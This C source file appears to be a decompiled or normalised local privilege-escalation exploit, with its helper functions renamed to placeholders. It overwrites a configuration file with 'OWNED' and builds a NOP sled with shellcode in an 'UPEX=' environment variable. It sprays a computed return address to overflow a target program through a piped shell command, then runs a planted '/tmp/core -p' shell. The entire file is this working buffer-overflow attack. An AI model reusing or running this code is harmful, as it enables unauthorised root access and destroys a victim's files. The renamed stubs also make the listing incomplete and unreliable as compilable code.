#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int ALIGN ; 
 int /*<<< orphan*/  DAT ; 
 int DBUF ; 
 char NOP ; 
 int OFFSET ; 
 char* PATH ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*,...) ; 
 int FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,char*,char*) ; 
 int /*<<< orphan*/ * stderr ; 
 int FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (char*) ; 

int FUNC12(int argc, char **argv){ 
   char eipeip[DBUF], buffer[7192]; 
   char go[DBUF + 22]; 
   FILE *calls; 
   int i, offset, align; 
   long address;

   FUNC11(argv[0]);

   /* Remove the config and write OWNED! */
   FUNC10(DAT);
   calls = FUNC2(DAT, "w");
   FUNC3(calls, "OWNED\n");
   FUNC1(calls);

   /* Do command line */
   if (argc > 1) {
      offset = FUNC0(argv[1]);
   }
   else {
      offset = OFFSET;
   } 

   if (argc > 2) { 
      align = FUNC0(argv[2]);
   } 
   else { 
      align = ALIGN;
   } 

   address = FUNC4() - offset;
 
   if (align > 0) {
      for(i=0; i < align; i++) {
	 eipeip[i] = 0x69;
      }
   }
 
   for (i=align; i < DBUF; i+=4) {
      *(long *)&eipeip[i] = address;
   } 
   for (i=0; i < (7192 - FUNC8(shellcode) - FUNC8(eipeip)); i++) {
      buffer[i] = NOP;
   }

   /* setup the environment */
   FUNC5(buffer + i, shellcode, FUNC8(shellcode)); 
   FUNC5(buffer, "UPEX=", 5);
   FUNC6(buffer);
   
   FUNC3(stderr, "Ret-addr: %#x, offset: %d, align: %d.\n", address, \
	   offset, align); 

   FUNC7(go, "(printf '1\n0\nC\n%s\n0\n')|%s", eipeip, PATH); //netcat style.
   FUNC9(go);

   FUNC3(stderr, "Score: core wins!\n");
   
#ifdef SH_IS_BASH   
   system("/tmp/core -p");
#else
   FUNC9("/tmp/core");
#endif

   return 0;
}